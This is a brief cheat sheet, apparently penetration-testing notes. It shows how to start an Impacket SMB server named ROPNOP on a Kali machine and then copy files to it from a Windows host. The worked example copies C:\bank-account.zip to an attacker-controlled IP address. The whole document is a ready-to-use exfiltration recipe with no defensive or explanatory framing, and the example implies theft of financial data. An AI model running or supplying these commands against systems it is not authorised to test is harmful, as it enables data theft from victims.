# 1) On Kali Box (Open SMB server and destination in /tmp/ folder)
python3 smbserver.py ROPNOP /tmp/

# 2) On Windows Machine:
copy C:\<path>\file \\<destination_ip>\ROPNOP
e.g. copy C:\bank-account.zip \\192.168.119.158\ROPNOP